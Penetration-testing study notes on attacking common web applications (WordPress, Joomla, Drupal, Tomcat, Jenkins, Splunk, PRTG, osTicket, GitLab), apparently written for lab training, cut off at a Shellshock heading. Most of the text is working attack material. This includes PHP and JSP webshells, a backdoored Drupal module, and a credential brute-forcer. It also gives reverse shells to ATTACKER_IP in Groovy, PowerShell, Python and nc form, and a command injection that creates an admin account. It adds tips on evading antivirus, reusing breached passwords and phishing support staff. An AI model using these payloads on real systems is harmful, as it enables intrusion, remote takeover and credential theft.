# Attacking Common Applications

## Introduction to Attacking Common Applications

The same applications show up in environment after environment — patched in one, misconfigured or forgotten in the next. Attack two angles: known/public vulns, and abuse of built-in functionality (admin panels, script consoles, task runners) to reach RCE.

App types worth hunting: CMS (WordPress, Joomla, Drupal, DotNetNuke), app servers (Tomcat, WebLogic, WebSphere, JBoss), SIEM (Splunk), network monitoring (PRTG, OpManager, Nagios, Zabbix), IT mgmt (Puppet), ticketing (osTicket, Zendesk), search (Elasticsearch, Solr), code repos/config mgmt (GitLab, GitHub, Bitbucket, JIRA), dev tools (Jenkins, Confluence, phpMyAdmin).

Pattern that pays off with unknown apps: fingerprint → try default creds (e.g. Nexus Repository OSS `admin:admin123`) → abuse admin API or Tasks functionality to run a Groovy script → RCE. OpManager lets you run scripts as the app user, usually `NT AUTHORITY\SYSTEM`.

### Module Targets

Labs simulate a large environment with vhosts on one host — FQDNs only resolve after adding hosts entries:

```bash
IP=<TARGET_IP>
printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts
```

If a spawned target isn't reachable via FQDN, check `/etc/hosts` first and update entries.

## Application Discovery & Enumeration

### Nmap - Web Discovery

Initial sweep of common web ports against the scope list, then screenshot tools, then deeper scans (top 10k or all ports depending on scope size). Enumeration is iterative — re-run the screenshotting tools against every subsequent Nmap scan.

```bash
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
```

### Initial Enumeration

```bash
sudo nmap --open -sV <TARGET_IP>
```

Service banners identify the apps — e.g. `Splunkd httpd` on 8000/8089, `Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)` on 8080, `Indy httpd` + Apache Tomcat on 8080. Ports 135/139/445/3389 alongside → Windows host.

Hostnames matter: `dev` in the FQDN → possibly untested features, debug mode enabled. A `gitlab-dev` host goes on the interesting list — public repos may hold credentials or clues to other vhosts, and GitLab instances often allow self-registration without admin approval. Old commits are worth checking for creds.

### Using EyeWitness

`sudo apt install eyewitness` (or clone + setup.sh, Docker, or Windows build). Takes Nmap/Nessus XML, screenshots every web app with Selenium, categorizes and fingerprints apps where possible, and suggests default credentials.

```bash
eyewitness --web -x web_discovery.xml -d <output_dir>
```

### Using Aquatone

Same idea — takes a .txt host list or Nmap/Masscan XML via `-nmap`:

```bash
cat web_discovery.xml | aquatone -nmap
```

### Interpreting the Results

Review the entire report before attacking anything — interesting hosts get buried deep in large reports (OpManager with `admin:admin` was found hundreds of pages into one external report, running as a Domain Admin → full compromise). Note URL + app name/version for every interesting host.

* Tomcat anywhere (especially external) → default creds on `/manager` and `/host-manager` → WAR upload → JSP RCE.
* Custom web apps → always test; also check whether a CMS (WordPress/Joomla/Drupal) runs underneath.
* Support portals (osTicket etc.) → possible sensitive data, or harvest a valid company email for signups elsewhere.
* Internal-only finds: printer login pages (sometimes leak cleartext LDAP creds), ESXi/vCenter, iLO/iDRAC, network/IoT devices, IP phones, internal code repos, SharePoint/intranet portals.
* Externals typically mix custom apps, CMS, Tomcat/Jenkins/Splunk, RDS portals, SSL VPN, OWA/O365, edge device logins.

## WordPress - Discovery & Enumeration

### Discovery/Footprinting

`/robots.txt` referencing `/wp-admin/` or `/wp-content/` is a dead giveaway. `/wp-admin` redirects to `/wp-login.php`, the back-end login. Plugins live in `wp-content/plugins`, themes in `wp-content/themes` — enumerate both carefully. Administrator access is usually enough for code execution; editors/authors may reach vulnerable plugins that normal users can't.

```bash
curl -s http://<TARGET_DOMAIN> | grep WordPress     # <meta name="generator" content="WordPress 5.8">
curl -s http://<TARGET_DOMAIN>/ | grep themes       # theme name in css path
curl -s http://<TARGET_DOMAIN>/ | grep plugins      # installed plugins + versions
curl -s "http://<TARGET_DOMAIN>/?p=1" | grep plugins  # more plugins visible on post pages
```

Browse plugin directories directly — directory listing + `readme.txt` files often fingerprint exact versions. Module example: mail-masta 1.0.0 (unauth LFI), wpDiscuz 7.0.4 (unauth RCE). Note versions, then research — but don't start exploiting the first flaw found; keep enumerating so nothing is missed.

### Enumerating Users

`/wp-login.php` error messages differ:

* valid user + wrong password → "The password for username X is incorrect."
* invalid username → "The username X is not registered on this site."

Straightforward username enumeration. The module example confirmed `admin`.

### WPScan

```bash
wpscan --url http://<TARGET_DOMAIN> --enumerate --api-token <TOKEN>   # free token from WPVulnDB
wpscan --url http://<TARGET_DOMAIN> --enumerate ap                    # all plugins, not just vulnerable ones
```

Default 5 threads, adjust with `-t`. Combines passive + aggressive detection; reports core/theme/plugin versions, known vulns with PoC links, and users (author id brute forcing + login error messages).

Caveats from the module run: it corrected the manually-identified theme (Transport Gravity is a child theme of Business Gravity), found an extra user (`john`) — but missed wpDiscuz and Contact Form 7 entirely. Manual + automated together, always.

Findings worth flagging from a scan: XML-RPC enabled (`/xmlrpc.php`) → brute-force avenue; directory listing enabled on `/wp-content/uploads/` and theme dirs; `readme.html` present.

## Attacking WordPress

### Login Bruteforce

WPScan does both `wp-login` (standard login page) and `xmlrpc` (login attempts via the `/xmlrpc.php` API — faster, preferred):

```bash
wpscan --password-attack xmlrpc -t 20 -U john -P rockyou.txt --url http://<TARGET_DOMAIN>
```

Module example: `john:firebird1`.

### Code Execution

Admin access → edit PHP source directly. Appearance → Theme Editor → select an **inactive** theme (e.g. Twenty Nineteen, to avoid corrupting the active one) → edit `404.php` → add one line just below the comments:

```php
system($_GET[0]);
```

Update File, then:

```bash
curl http://<TARGET_DOMAIN>/wp-content/themes/twentynineteen/404.php?0=id
```

Metasploit alternative — uploads a malicious plugin and fires a PHP Meterpreter:

```
use exploit/unix/webapp/wp_admin_shell_upload
set username john
set password firebird1
set lhost <ATTACKER_IP>
set rhost <TARGET_IP>
set VHOST <TARGET_DOMAIN>
```

Both RHOST **and** VHOST must be set, or the exploit aborts with "The target does not appear to be using WordPress".

### Leveraging Known Vulnerabilities

Most WordPress vulns live in plugins (of \~23,600 in the WPScan DB at time of writing: 89% plugins, 4% core, 7% themes). Use `waybackurls` to find old versions of the site — plugins "removed" but not properly deleted may still be reachable and exploitable.

**mail-masta (unsupported, ≤1.0)** — the `pl` parameter does `include($_GET['pl'])` with no validation:

```bash
curl -s http://<TARGET_DOMAIN>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

Also unauthenticated SQL injection in the same plugin.

**wpDiscuz 7.0.4 (CVE-2020-24186)** — file upload bypass of the image-only mime check → PHP webshell, unauthenticated:

```bash
python3 wp_discuz.py -u http://<TARGET_DOMAIN> -p /?p=1
```

The script's built-in command execution may fail, but the webshell is uploaded — the exploit prints the random upload path; run commands through it:

```bash
curl -s http://<TARGET_DOMAIN>/wp-content/uploads/2021/08/<webshell>.php?cmd=id
```

## Joomla - Discovery & Enumeration

### Discovery/Footprinting

```bash
curl -s http://<TARGET_DOMAIN>/ | grep Joomla                  # <meta name="generator" content="Joomla! - Open Source Content Management">
curl -s http://<TARGET_DOMAIN>/README.txt | head -n 5          # "Joomla! installation/upgrade package to version 3.x"
```

robots.txt typical for Joomla: `Disallow: /administrator/`, `/bin/`, `/cache/`, `/cli/`, `/components/`, `/includes/`, `/installation/`, `/language/`, `/layouts/`, `/libraries/`, `/logs/`, `/modules/`, `/plugins/`, `/tmp/`. Also look for the Joomla favicon, and version in JS files under `media/system/js/`.

Exact version:

```bash
curl -s http://<TARGET_DOMAIN>/administrator/manifests/files/joomla.xml | xmllint --format -
# <version>3.9.4</version>
```

`plugins/system/cache/cache.xml` gives an approximate version.

### Enumeration

droopescan (works for Joomla but limited):

```bash
droopescan scan joomla --url http://<TARGET_DOMAIN>/
```

Returns possible versions plus interesting URLs (joomla.xml, login page at `/administrator/`, cache.xml).

JoomlaScan (Python2, needs `python2 -m pip install bs4`) — finds components, explorable directories, and XML files, helpful for fingerprinting installed extensions:

```bash
python2 joomlascan.py -u http://<TARGET_DOMAIN>
```

Login portal: `/administrator/index.php`. No user enumeration — generic "Username and password do not match or you do not have an account yet." The default admin account is `admin`, but the password is set at install time, so it's guesswork or light brute forcing:

```bash
python3 joomla-brute.py -u http://<TARGET_DOMAIN> -w http_default_pass.txt -usr admin
```

Module example: `admin:admin`.

## Attacking Joomla

### Abusing Built-In Functionality

Log in to `/administrator`, then Templates (bottom left, under Configuration) → click a template name (e.g. **protostar**) → Templates: Customise → pick a page (e.g. `error.php`) → add a PHP one-liner:

```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

Save & Close, confirm:

```bash
curl -s http://<TARGET_DOMAIN>/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

Habit-forming detail: use non-standard parameter names (an md5 hash works) so a drive-by attacker can't stumble onto your shell. Clean up afterwards and note the file in the report.

If the control panel errors with "Call to a member function format() on null" after login: browse to `index.php?option=com_plugins` and disable the "Quick Icon - PHP Version Check" plugin.

### Leveraging Known Vulnerabilities

**CVE-2019-10945** — directory traversal + authenticated arbitrary file deletion, Joomla 1.5.0 through 3.9.4. Only useful when the admin portal isn't reachable from outside (with admin creds, template editing gives RCE directly). The script lists directory contents — traversal may reach sensitive files like `configuration.php`:

```bash
python2.7 joomla_dir_trav.py --url "http://<TARGET_DOMAIN>/administrator/" --username admin --password admin --dir /
```

## Drupal - Discovery & Enumeration

### Discovery/Footprinting

"Powered by Drupal" header/footer, the Drupal logo, `CHANGELOG.txt`/`README.txt`, page source, robots.txt references to `/node`. Drupal indexes content as nodes — URIs of the form `/node/<nodeid>`, useful for identification when a custom theme is in use. Not every install shows or even allows reaching the login page.

```bash
curl -s http://<TARGET_DOMAIN> | grep Drupal
# <meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
```

Default user types: Administrator (complete control), Authenticated (add/edit content per permissions), Anonymous (read only).

### Enumeration

```bash
curl -s http://<TARGET_DOMAIN>/CHANGELOG.txt | grep -m2 ""
# Drupal 7.57, 2018-02-21
```

Newer installs return 404 on CHANGELOG.txt (blocked by default) — fall back to scanning:

```bash
droopescan scan drupal -u http://<TARGET_DOMAIN>
```

Much stronger Drupal support than Joomla: plugins found (e.g. `modules/php/` — the PHP module present), possible versions, default admin at `/user/login`.

Version drives the next move: the module's 8.9.1 had no obvious core vulns → pivot to installed plugins or built-in functionality abuse.

## Attacking Drupal

Getting a shell from the Drupal admin console is not as simple as editing a theme file like WordPress/Joomla.

### Leveraging the PHP Filter Module

**Drupal 7 (pre-8):** log in as admin → Modules → enable **PHP filter** ("Allows embedded PHP code/snippets to be evaluated") → Save. Content → Add content → Basic page → insert the snippet and set the Text format dropdown to **PHP code** → save:

```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

```bash
curl -s "http://<TARGET_DOMAIN>/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id" | grep uid | cut -f4 -d">"
```

**Drupal 8+:** PHP filter is not installed by default — download and install it yourself (check with the client first, you're changing their instance):

```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

Administration → Reports → Available updates (or the Extend menu, depending on version) → Browse → Install. Then same Basic page flow as above.

### Uploading a Backdoored Module

Take a legitimate module (e.g. CAPTCHA), add a shell plus a `.htaccess` (Drupal denies direct access to `/modules`), repackage, install:

```php
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```

```apache
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

```bash
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```

Manage → Extend → + Install new module → upload the archive → after install:

```bash
curl -s http://<TARGET_DOMAIN>/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

### Leveraging Known Vulnerabilities

The three Drupalgeddons:

* **CVE-2014-3704 (Drupalgeddon):** 7.0–7.31, fixed in 7.32. Pre-auth SQLi → upload a malicious form or create a new admin user.
* **CVE-2018-7600 (Drupalgeddon2):** prior to 7.58 and 8.5.1. RCE via insufficient input sanitization during user registration.
* **CVE-2018-7602 (Drupalgeddon3):** multiple Drupal 7.x/8.x. Authenticated RCE via improper Form API validation; requires a user who can delete a node.

#### Drupalgeddon

PoC adds an admin account, then RCE via the PHP filter route above:

```bash
python2.7 drupalgeddon.py -t http://<TARGET_DOMAIN> -u hacker -p pwnd
```

Metasploit equivalent: `exploit/multi/http/drupal_drupageddon`.

#### Drupalgeddon2

PoC (a2u/CVE-2018-7600) prompts for the target URL and uploads a proof file (`hello.txt`). For a shell, replace the script's `echo` command with one that writes a webshell:

```bash
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```

Run the modified script against the target, then:

```bash
curl http://<TARGET_DOMAIN>/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

#### Drupalgeddon3

Metasploit `multi/http/drupal_drupageddon3`. Log in first and grab a valid session cookie from the browser, then:

```
set rhosts <TARGET_IP>
set VHOST <TARGET_DOMAIN>
set drupal_session <SESSION_COOKIE>
set DRUPAL_NODE 1
set LHOST <ATTACKER_IP>
```

## Tomcat - Discovery & Enumeration

Tomcat usually sits at the top of "High Value Targets" in an EyeWitness report. More common internally, but an excellent external foothold when found.

### Discovery/Footprinting

The `Server` header leaks Tomcat + version — request an invalid page (works even behind a reverse proxy). Custom error pages may hide it; the default `/docs` page then gives it away (`Apache Tomcat 9 (9.0.30)` in the title) and is rarely removed.

Structure worth knowing:

* `conf/tomcat-users.xml` — credentials + roles governing `/manager` and `/host-manager`
* `webapps/` — default webroot
* each app: `WEB-INF/web.xml` (deployment descriptor — routes and the classes handling them), `WEB-INF/classes` (compiled classes, business logic, possible sensitive info), `WEB-INF/lib`, JSP files

`web.xml` maps servlets to classes — e.g. `com.inlanefreight.api.AdminServlet` → `classes/com/inlanefreight/api/AdminServlet.class`. Prime target when you have an LFI.

Built-in manager roles from tomcat-users.xml:

* `manager-gui` — HTML GUI + status pages
* `manager-script` — HTTP API + status pages
* `manager-jmx` — JMX proxy + status pages
* `manager-status` — status pages only

Example entries: `tomcat:tomcat` (manager-gui), `admin:admin` (manager-gui, admin-gui).

### Enumeration

Hunt for `/manager` and `/host-manager` — Gobuster or browse directly:

```bash
gobuster dir -u http://<TARGET_DOMAIN>:8180/ -w directory-list-2.3-small.txt
```

Try weak credentials first (tomcat:tomcat, admin:admin...). Manager access → WAR upload → JSP webshell → RCE. If defaults fail, brute force.

## Attacking Tomcat

### Tomcat Manager - Login Brute Force

```
use auxiliary/scanner/http/tomcat_mgr_login
set VHOST <TARGET_DOMAIN>
set RPORT 8180
set stop_on_success true
set rhosts <TARGET_IP>
```

Default wordlists: `tomcat_mgr_default_users.txt`, `tomcat_mgr_default_pass.txt`, `tomcat_mgr_default_userpass.txt`. Module example hit: `tomcat:admin`.

Debugging a misbehaving module through Burp — `set PROXIES HTTP:127.0.0.1:8080` — shows each attempt base64-encoded in the Authorization header, exactly as Tomcat basic auth expects.

The module's standalone Python brute-forcer (mgr\_brute.py):

```python
#!/usr/bin/python

import requests
from termcolor import cprint
import argparse

parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")

parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")

args = parser.parse_args()

url = args.url
uri = args.path
users_file = args.usernames
passwords_file = args.passwords

new_url = url + uri
f_users = open(users_file, "rb")
f_pass = open(passwords_file, "rb")
usernames = [x.strip() for x in f_users]
passwords = [x.strip() for x in f_pass]

cprint("\n[+] Atacking.....", "red", attrs = ['bold'])

for u in usernames:
    for p in passwords:
        r = requests.get(new_url,auth = (u, p))

        if r.status_code == 200:
            cprint("\n[+] Success!!", "green", attrs = ['bold'])
            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
            break
    if r.status_code == 200:
        break

if r.status_code != 200:
    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
```

```bash
python3 mgr_brute.py -U http://<TARGET_DOMAIN>:8180/ -P /manager -u tomcat_mgr_default_users.txt -p tomcat_mgr_default_pass.txt
```

### Tomcat Manager - WAR File Upload

`/manager/html` (manager-gui role) deploys WAR files instantly. Package a JSP web shell:

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
```

Manager GUI → Browse → select the .war → Deploy. The `/backup` app appears in the table; hit the shell at:

```bash
curl http://<TARGET_DOMAIN>:8180/backup/cmd.jsp?cmd=id
```

Cleanup: Undeploy from the manager page (removes the WAR and the extracted directory); note the upload location (e.g. `/opt/tomcat/apache-tomcat-10.0.10/webapps`) for the report.

Or skip the GUI shell and generate a reverse shell WAR:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4443 -f war > backup.war
```

Deploy, start `nc -lnvp 4443`, browse to the app. `multi/http/tomcat_mgr_upload` automates the whole process.

The fuzzdb cmd.jsp is under 1kb and flagged by only 2/58 AV vendors — changing one string (`"Uploaded:"` → `"uPlOaDeD:"`) dropped it to 0/58.

On web shells generally: randomize the filename, limit access to your source IP, optionally password protect — don't leave a foothold a third party can hijack.

### CVE-2020-1938: Ghostcat

Unauthenticated LFI via the AJP protocol (binary proxy protocol, usually port 8009). Affects Tomcat before 9.0.31, 8.5.51, and 7.0.100. Confirm the port:

```bash
nmap -sV -p 8009,8080 <TARGET_DOMAIN>
```

The exploit only reads files within the webapps folder (no `/etc/passwd`):

```bash
python2.7 tomcat-ajp.lfi.py <TARGET_DOMAIN> -p 8009 -f WEB-INF/web.xml
```

`WEB-INF/web.xml` may hold sensitive data — routes, classes.

## Jenkins - Discovery & Enumeration

### Discovery/Footprinting

Runs on Tomcat port 8080 by default; port 5000 attaches slave servers (master/slave communication). Auth can be a local DB, LDAP, Unix users, delegated to the servlet container, or none at all — admins can also allow/disallow self-registration. Default install uses Jenkins' own database with registration disabled. The telltale login page fingerprints it quickly.

### Enumeration

Check for weak/default credentials (`admin:admin`) or no authentication at all — unauthenticated Jenkins instances are not uncommon internally, and Jenkins often runs as root or SYSTEM, making it an easy AD foothold.

## Attacking Jenkins

### Script Console

`http://<TARGET_DOMAIN>:8000/script` runs arbitrary Groovy scripts in the Jenkins controller runtime — effectively a web shell. Command execution:

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

Linux reverse shell:

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<ATTACKER_IP>/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

Windows command execution:

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

Windows Java reverse shell (swap host/port):

```groovy
String host="<ATTACKER_IP>";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

On Windows you could also add a user and connect over RDP/WinRM, or avoid system changes with a PowerShell download cradle + Invoke-PowerShellTcp.ps1.

### Miscellaneous Vulnerabilities

* CVE-2018-1999002 + CVE-2019-1003000 combined → pre-authenticated RCE bypassing script security sandbox protection during script compilation. Public PoCs exploit a dynamic routing flaw to bypass the Overall/Read ACL and use Groovy to download and execute a malicious JAR — users with read permission can run code on the master. Works against Jenkins 2.137.
* Jenkins 2.150.2: users with JOB creation and BUILD privileges can execute code via Node.js. Requires auth, but with anonymous access enabled it works unauthenticated — anonymous users hold those privileges by default.

Both fixed in current LTS; the exploits are version-specific.

## Splunk - Discovery & Enumeration

### Discovery/Footprinting

Web server on port 8000, management port 8089 (REST API). Frequently runs as root on Linux or SYSTEM on Windows. Very few known vulns and quick patching — the real focus is weak or null authentication, since admin access means deploying custom apps → RCE, potentially across the network.

Older versions default to `admin:changeme`, conveniently displayed right on the login page. Newer versions set credentials at install — if defaults fail, try admin, Welcome, Welcome1, Password123.

```bash
sudo nmap -sV <TARGET_IP>
# 8000/tcp open ssl/http Splunkd httpd
# 8089/tcp open ssl/http Splunkd httpd
```

### Enumeration

The Enterprise trial converts to the free version after 60 days — **no authentication at all**. Forgotten trial installs are a classic find. Once in (or on Free): browse data, run reports, install Splunkbase apps, install custom applications.

Code execution avenues: server-side Django applications, REST endpoints, scripted inputs, alerting scripts. Scripted inputs exist to integrate Splunk with data sources — they run Bash, PowerShell, or Batch scripts, and every Splunk install ships with Python, so a Python reverse shell works on any Splunk system. Vulnerability scans against Splunk mostly return non-exploitable noise — know the built-in functionality route instead.

## Attacking Splunk

### Abusing Built-In Functionality

Custom application with a scripted input. Structure:

```
splunk_shell/
├── bin        # scripts to run (rev.py / run.ps1 / run.bat)
└── default    # inputs.conf
```

`default/inputs.conf` — enables the scripts and sets the run interval in seconds (scripts only run with this present):

```ini
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

`bin/run.bat` executes the PowerShell one-liner when the app deploys:

```batch
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

`bin/run.ps1` — PowerShell reverse shell:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Package it, start a listener, upload via Apps → Install app from file:

```bash
tar -cvzf updater.tar.gz splunk_shell/
sudo nc -lnvp 443
```

The app is auto-enabled on upload → immediate callback. Module example came back as `NT AUTHORITY\SYSTEM`.

Linux target — swap in a Python reverse shell (`bin/rev.py`), same process:

```python
import sys,socket,os,pty

ip="<ATTACKER_IP>"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

If the compromised host is a **deployment server**, place the app in `$SPLUNK_HOME/etc/deployment-apps` to push RCE to every host running a Universal Forwarder. UFs don't install Python — use the PowerShell version in Windows-heavy environments.

## PRTG Network Monitor

### Discovery/Footprinting/Enumeration

Agentless network monitoring with an AJAX web interface, typically on ports 80, 443, or 8080 (port is changeable in Setup as admin):

```bash
sudo nmap -sV -p- --open -T4 <TARGET_IP>
# 8080/tcp open http Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
```

EyeWitness flags PRTG and its default credentials `prtgadmin:prtgadmin` — usually pre-filled on the login page and often unchanged. Nessus also detects it. Confirm the version:

```bash
curl -s http://<TARGET_IP>:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
```

Module lab: version 17.3.33.2830; default creds failed, `prtgadmin:Password123` worked. HTB box Netmon showcases PRTG.

### Leveraging Known Vulnerabilities

**CVE-2018-9276** — authenticated command injection in the PRTG System Administrator console, before 18.2.39. When creating a notification, the **Parameter** field is passed directly into a PowerShell script with no sanitization.

Setup (top right) → Account Settings → Notifications → Add new notification → name it → tick **EXECUTE PROGRAM** → Program File: `Demo exe notification - outfile.ps1` → Parameter field:

```
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```

Save, then click **Test** to execute. Blind — no output feedback, so verify out-of-band. Confirm local admin:

```bash
sudo crackmapexec smb <TARGET_IP> -u prtgadm1 -p Pwn3d_by_PRTG!
```

Then RDP, WinRM, evil-winrm, or impacket `wmiexec.py`/`psexec.py`. Scheduling the notification to run at a set time doubles as a persistence mechanism on long engagements.

## osTicket

### Footprinting/Discovery/Enumeration

PHP/MySQL support ticketing system. Fingerprint: `OSTSESSID` cookie, "powered by osTicket" logo in the footer, "Support Ticket System" text. Nmap only shows the underlying webserver — no app fingerprint.

Functionally the app breaks down as user input → processing → solution: a user reports a problem, staff reproduce and debug it, and more technical staff get pulled into the email thread. That thread is where new email addresses and usernames surface — combined with "playing dumb" about a technical problem, a standard social engineering approach against support staff.

### Attacking osTicket

osTicket 1.14.1 suffers CVE-2020-24881 (SSRF → internal resource access / port scanning), plus assorted historical RFI/SQLi/upload/XSS issues. But even a fully patched portal is attackable:

* Submit a new ticket → the portal may assign a **temporary internal email address** for the ticket (module example: ticket 940288 → `940288@inlanefreight.local`). Emails sent to it appear in the ticket thread.
* Use that address to register on other company services that require a valid company email and receive the confirmation email via the portal — Slack/Mattermost/Rocket.chat, GitLab, wikis. Demonstrated on HTB box **Delivery**.

### osTicket - Sensitive Data Exposure

{% stepper %}
{% step %}
## OSINT with Dehashed

Cleartext creds for company users:

```bash
sudo python3 dehashed.py -q inlanefreight.local -p
```
{% endstep %}

{% step %}
## Try credentials against the staff login

Try them against the staff login `/scp/login.php` — the page accepts **email or username**; the module's `kevin@inlanefreight.local` worked when the username form didn't.
{% endstep %}

{% step %}
## Review closed tickets

Read the agent's closed tickets. One contained a VPN password-reset conversation: the agent reset the user's password to the **standard new-joiner password** and then sent it in cleartext through the portal.
{% endstep %}

{% step %}
## Reuse the standard password

Reuse that standard password against the exposed VPN portal — and spray it against a user list built with linkedin2username, since lax password policies often skip forced change at first login.
{% endstep %}

{% step %}
## Export the address book

Export the address book — emails/usernames feed the same password spraying.
{% endstep %}
{% endstepper %}

## GitLab - Discovery & Enumeration

### Footprinting & Discovery

The login page with the GitLab logo identifies it. 2FA is disabled by default.

* Version number is only visible at `/help` **when logged in**. If you can't register an account, don't blind-fire exploits — hunt for secrets instead. Notable exploited versions: GitLab 12.9.0, 11.4.7, and CE 13.10.3/13.9.3/13.10.2.
* `/explore` lists public projects without authentication — dig for infrastructure details, production code to review, hardcoded credentials, scripts/configs with secrets, SSH or API keys.
* Registration, if allowed, unlocks internal projects (module example: registering `hacker:Welcome` exposed an internal website project in `/explore`).

### Enumeration

The registration form is a **user and email enumerator**: "Username is already taken" / "Email has already been taken". Works on the latest version, and even with sign-up disabled in settings you can still browse `/users/sign_up` and enumerate users — you just can't register.

With a valid user list: weak-password guessing, spraying (Welcome1, Password123...), or reuse of creds from breach dumps.

## Attacking GitLab

### Username Enumeration

```bash
./gitlab_userenum.sh --url http://<TARGET_DOMAIN>:8081/ --userlist users.txt
```

Module run found `root` (the built-in admin) and `bob`.

Lockout defaults below 16.6: 10 failed login attempts, automatic unlock after 10 minutes. From 16.6 these are configurable in the admin UI (`max_login_attempts`, `failed_login_attempts_unlock_period_in_minutes`):

```ruby
config.maximum_attempts = 10
config.unlock_in = 10.minutes
```

### Authenticated Remote Code Execution

GitLab Community Edition 13.10.2 and lower — ExifTool mishandles metadata in uploaded images → authenticated RCE. Any valid user works, so **self-registration + vulnerable version = instant RCE**:

```bash
python3 gitlab_13_10_2_rce.py -t http://<TARGET_DOMAIN>:8081 -u <USERNAME> -p <PASSWORD> -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <ATTACKER_IP> 8443 >/tmp/f '
```

Shell comes back as the `git` user.

## Attacking Tomcat CGI

**CVE-2019-0232** — RCE on Windows when the CGI Servlet's `enableCmdLineArguments` is enabled. The query string is turned into command line arguments without proper validation → OS command injection using `&` as the batch separator. Affects Tomcat 9.0.0.M1–9.0.17, 8.5.0–8.5.39, 7.0.0–7.0.93.

### Enumeration

```bash
nmap -p- -sC -Pn <TARGET_IP> --open
# 8080/tcp open http-proxy — Apache Tomcat/9.0.17
```

The default CGI directory is `/cgi`. On Windows, fuzz for batch scripts — try both extensions:

```bash
ffuf -w common.txt -u http://<TARGET_IP>:8080/cgi/FUZZ.cmd   # found nothing
ffuf -w common.txt -u http://<TARGET_IP>:8080/cgi/FUZZ.bat   # found welcome.bat
```

Browsing `http://<TARGET_IP>:8080/cgi/welcome.bat` returns a placeholder message — still exploitable.

### Exploitation

Append commands after `&`:

```
http://<TARGET_IP>:8080/cgi/welcome.bat?&dir
```

`dir` works; `whoami` returns nothing. Pull the environment variables to see why:

```
http://<TARGET_IP>:8080/cgi/welcome.bat?&set
```

**PATH is unset** — hardcode binary paths. But `c:\windows\system32\whoami.exe` errors on the special characters (the patch added a regex filter) — URL-encode the payload:

```
http://<TARGET_IP>:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

## Attacking Common Gateway Interface (CGI) Applications - Shellshock

### Shellshock via CGI

